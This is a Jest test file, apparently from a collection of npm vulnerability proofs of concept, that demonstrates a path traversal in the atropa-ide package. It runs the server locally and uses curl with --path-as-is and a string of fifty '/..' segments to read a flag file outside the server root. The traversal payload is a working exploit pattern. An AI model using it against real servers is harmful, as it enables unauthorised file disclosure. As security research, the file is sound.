//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/atropa-ide/test.js
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in atropa-ide", (done) => {
    const ide = require('atropa-ide');
    const fs = require("fs");
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    const path = require('path');
    let port = 8884;
    let serverRoot = path.resolve(__dirname);
    ide.start(port, serverRoot);

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8884${genstr()}"`;

    exec(attack_string, (error, stdout) => {
        expect(stdout).toBe(hostsFile);
        done();
    });
});
